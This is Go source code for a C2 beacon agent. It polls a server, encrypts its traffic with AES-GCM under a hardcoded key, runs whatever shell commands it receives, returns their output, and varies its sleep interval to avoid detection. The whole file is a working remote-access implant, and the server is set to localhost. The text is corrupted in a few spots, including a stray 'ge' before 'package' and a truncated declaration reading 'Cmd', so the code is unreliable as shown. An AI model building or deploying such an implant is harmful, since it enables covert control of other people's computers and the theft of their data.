gepackage main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	mrand "math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

/* ---------- CONFIG ---------- */

var serverURL = "http://127.0.0.1:8080/beacon"
var secretKey = []byte("01234567890123456789012345678901")

/* ---------- STATE ---------- */

var currentDir, _ = os.Getwd()

/* ---------- STRUCTS ---------- */

type Beacon struct {
	Agent  string `json:"agent"`
	Status string `json:"status"`
	TaskID string `json:"task_id,omitempty"`
	Output string `json:"output,omitempty"`
}

type Task struct {
	ID  string `json:"id"`
	Cmd string `json:"cmd"`
}

/* ---------- ENCRYPTION ---------- */

func encrypt(data []byte) string {
	block, _ := aes.NewCipher(secretKey)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	io.ReadFull(crand.Reader, nonce)
	return base64.StdEncoding.EncodeToString(
		gcm.Seal(nonce, nonce, data, nil),
	)
}

func decrypt(enc string) ([]byte, error) {
	raw, _ := base64.StdEncoding.DecodeString(enc)
	block, _ := aes.NewCipher(secretKey)
	gcm, _ := cipher.NewGCM(block)
	return gcm.Open(nil, raw[:gcm.NonceSize()], raw[gcm.NonceSize():], nil)
}

/* ---------- COMMAND EXEC ---------- */

func executeCommand(cmd string) string {

	// ✅ FIX: cd handled as STATE
	if strings.HasPrefix(cmd, "cd ") {
		target := strings.TrimSpace(strings.TrimPrefix(cmd, "cd "))
		newDir := filepath.Join(currentDir, target)
		if err := os.Chdir(newDir); err != nil {
			return err.Error()
		}
		currentDir, _ = os.Getwd()
		return "Directory changed to " + currentDir
	}

	Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/C", cmd)
	} else {
		c = exec.Command("sh", "-c", cmd)
	}
	c.Dir = currentDir

	out, err := c.CombinedOutput()
	if err != nil {
		return string(out)
	}
	return string(out)
}

/* ---------- BEACON ---------- */

func beacon(b Beacon) *Task {
	payload, _ := json.Marshal(b)
	enc := encrypt(payload)

	req, _ := json.Marshal(map[string]string{"data": enc})
	resp, err := http.Post(serverURL, "application/json", bytes.NewBuffer(req))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	var res map[string]string
	json.NewDecoder(resp.Body).Decode(&res)
	dec, err := decrypt(res["data"])
	if err != nil {
		return nil
	}

	var msg struct {
		Task *Task `json:"task"`
	}
	json.Unmarshal(dec, &msg)
	return msg.Task
}

/* ---------- JITTER ---------- */

func sleepJitter() {
	base := 10
	j := mrand.Intn(6) - 3
	time.Sleep(time.Duration(base+j) * time.Second)
}

/* ---------- MAIN ---------- */

func main() {
	fmt.Println("[*] Agent started")
	mrand.Seed(time.Now().UnixNano())

	for {
		task := beacon(Beacon{
			Agent:  "go-agent",
			Status: "alive",
		})

		if task != nil {
			fmt.Println("[*] Executing:", task.Cmd)
			out := executeCommand(task.Cmd)

			beacon(Beacon{
				Agent:  "go-agent",
				Status: "alive",
				TaskID: task.ID,
				Output: out,
			})

			sleepJitter()
			continue // ✅ prevents extra alive beacon
		}

		sleepJitter()
	}

}
